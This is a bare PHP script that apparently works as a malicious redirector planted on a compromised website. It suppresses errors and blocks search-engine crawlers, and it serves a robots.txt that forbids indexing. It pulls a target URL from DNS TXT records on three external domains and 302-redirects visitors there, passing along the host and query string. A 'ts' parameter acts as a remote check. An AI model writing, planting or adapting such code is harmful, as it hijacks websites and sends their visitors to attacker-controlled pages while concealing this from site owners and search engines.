<?php

error_reporting(0);

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

if (substr_count($ip, ".") == 3 && !isset($_GET['ts']))
{
    $ip = "ip.".$ip.".";
} else {
    $ip = "";
}

$d = array('fetch.%sliercoup.us', 'fetch.%sacceptertra.website', 'fetch.%sdoktogo.ooo');
foreach ($d as $k=>$v)
{
    $d[$k] = sprintf($v, $ip);
}

$ua = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';

if (preg_match('/googlebot|slurp|bingbot|Baiduspider|AhrefsBot|Ezooms|MJ12bot|YandexBot|MSNBot|ia_archiver|lycos/i', $ua))
{
	die();
}

if (strpos(strtolower($_SERVER['REQUEST_URI']), 'robots.txt') > 0)
{
	die("User-agent: *\r\nDisallow: /\r\n");
}

for ($i = rand(0, count($d)); $i < 20 + count($d); $i++)
{
    $s = dns_get_record($d[$i % count($d)], DNS_TXT);
    $location = '';

    if (is_array($s) && (count($s) > 0) && isset($s[0]['txt']) && strlen($s[0]['txt']))
    {
        if ((strpos($s[0]['txt'], 'blocked')) !== FALSE)
        {
            header("HTTP/1.1 500 Internal Server Error");
            die();
        }
        if ((strpos($s[0]['txt'], 'http')) !== FALSE)
        {
            $location = $s[0]['txt'];
            break;
        }
    }
}

if (!strlen($location))
    die();

if (isset($_GET['ts'])) {
    echo "OK".$location."ERR";
} else {
    header('Location: '.$location."?sub_id_2=".urlencode($_SERVER['HTTP_HOST'])."&sub_id_1=".urlencode(urldecode($_SERVER['QUERY_STRING'])), TRUE, 302);
}
